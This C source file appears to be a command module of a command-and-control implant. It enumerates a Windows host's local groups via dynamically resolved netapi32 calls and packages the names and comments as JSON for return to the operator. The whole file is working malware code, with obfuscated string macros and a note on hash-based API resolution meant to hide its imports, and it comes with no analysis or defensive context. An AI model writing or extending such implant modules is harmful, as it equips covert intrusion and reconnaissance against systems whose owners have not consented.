#include "config.h"
#ifdef INCLUDE_CMD_LOCALGROUP

#include "commands.h"
#include "json_out.h"

typedef DWORD (WINAPI *fn_NetLocalGroupEnum_t)(LPCWSTR, DWORD, void**, DWORD, DWORD*, DWORD*, DWORD*);
typedef DWORD (WINAPI *fn_NetApiBufferFree_t)(void*);

VOID cmd_localgroup(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    xstr(_net, "netapi32.dll");
    HMODULE h_net = inst->Win32.LoadLibraryA(_net);
    // GetProcAddress directly: the hash-based resolve failed for
    // NetLocalGroupEnum while NetShareEnum (same DLL, same pattern) resolved -
    // skip the hash walk entirely.
    fn_NetLocalGroupEnum_t pEnum = h_net ?
        (fn_NetLocalGroupEnum_t)(void*)inst->Win32.GetProcAddress(h_net, "NetLocalGroupEnum") : NULL;
    fn_NetApiBufferFree_t pFree = h_net ?
        (fn_NetApiBufferFree_t)(void*)inst->Win32.GetProcAddress(h_net, "NetApiBufferFree") : NULL;
    if (!pEnum || !pFree) {
        package_add_string(inst, response, XSTR("netapi32 resolve failed"));
        response->is_error = TRUE;
        return;
    }

    // wide->narrow via kernel32 (WideCharToMultiByte is a FUNCTION, not a DLL)
    xstr(_k32s, "kernel32.dll");
    HMODULE h_k32s = inst->Win32.LoadLibraryA(_k32s);
    typedef int (WINAPI *fn_wc_t)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
    fn_wc_t wc = h_k32s ? (fn_wc_t)(void*)inst->Win32.GetProcAddress(h_k32s, "WideCharToMultiByte") : NULL;

    BYTE* buf = NULL;
    DWORD entries = 0, total = 0, resume = 0;
    DWORD status = pEnum(NULL, 1, (void**)&buf, 0xFFFFFFFF, &entries, &total, &resume);
    if (status != 0 || !buf) {
        package_add_string(inst, response, XSTR("NetLocalGroupEnum failed"));
        response->is_error = TRUE;
        return;
    }

    JSON_BUF jb;
    j_init(&jb);
    j_append_raw(&jb, "{\"groups\":[");
    // LOCALGROUP_INFO_1: LPWSTR name, LPWSTR comment
    BYTE* p = buf;
    for (DWORD i = 0; i < entries; i++) {
        wchar_t* name = *(wchar_t**)(p + 0);
        wchar_t* comment = *(wchar_t**)(p + 8);
        p += 16;
        if (i) j_append_raw(&jb, ",");
        j_append_raw(&jb, "{\"name\":");
        if (name) {
            char nb[128] = {0};
            if (wc) wc(0, 0, name, -1, nb, 128, NULL, NULL);
            j_append_str(&jb, nb);
        } else j_append_str(&jb, "-");
        j_append_raw(&jb, ",\"comment\":");
        if (comment) {
            char cb[256] = {0};
            if (wc) wc(0, 0, comment, -1, cb, 256, NULL, NULL);
            j_append_str(&jb, cb);
        } else j_append_str(&jb, "-");
        j_append_raw(&jb, "}");
    }
    j_append_raw(&jb, "],\"count\":");
    j_append_uint(&jb, entries);
    j_append_raw(&jb, "}");
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
    pFree(buf);
}

#endif
